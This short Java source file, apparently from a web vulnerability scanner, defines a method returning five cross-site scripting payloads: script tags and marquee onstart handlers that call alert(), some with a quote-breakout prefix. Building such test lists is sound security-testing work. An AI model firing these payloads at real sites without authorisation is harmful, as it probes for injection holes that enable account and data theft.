/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package payload;

import java.util.ArrayList;

/**
 *
 * @author Shaco JX
 */
public class A3p {

    public ArrayList<String> XSS() {
        ArrayList<String> list = new ArrayList<>();
        list.add("<script>alert(123);</script>\n");
        list.add("<marquee onstart='javascript:alert('1');'>=(◕_◕)=");
        list.add("\"><marquee onstart='javascript:alert('1');'>=(◕_◕)=");
        list.add("<script>alert(1);</script>");
        list.add("\"><script>alert(1);</script>");
        return list;
    }
}